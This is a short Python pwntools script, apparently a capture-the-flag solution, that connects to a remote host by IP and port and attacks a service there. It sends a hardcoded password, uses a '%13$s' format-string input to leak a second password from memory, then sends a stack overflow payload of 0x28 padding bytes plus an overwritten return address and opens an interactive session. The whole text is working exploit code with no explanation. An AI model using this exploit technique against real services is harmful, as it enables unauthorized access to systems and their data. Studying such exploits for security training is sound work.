from pwn import *
context.log_level='debug'
#r=process("./pwn")
r=remote("39.107.58.236",45602)
#gdb.attach(r)
pause()
r.recvuntil(b"Password: ")
r.sendline(b"supersecureuser")
r.recvuntil(b"Write Something")
r.sendline(b"%13$s")
pwd=r.recvuntil("Password")[1:-9]
print(pwd)
pause()
r.recvuntil(b":")
r.sendline(pwd)
r.recvuntil(b"Note:")
pay=b'a'*0x28+p64(0x401262)
r.sendline(pay)
r.interactive()
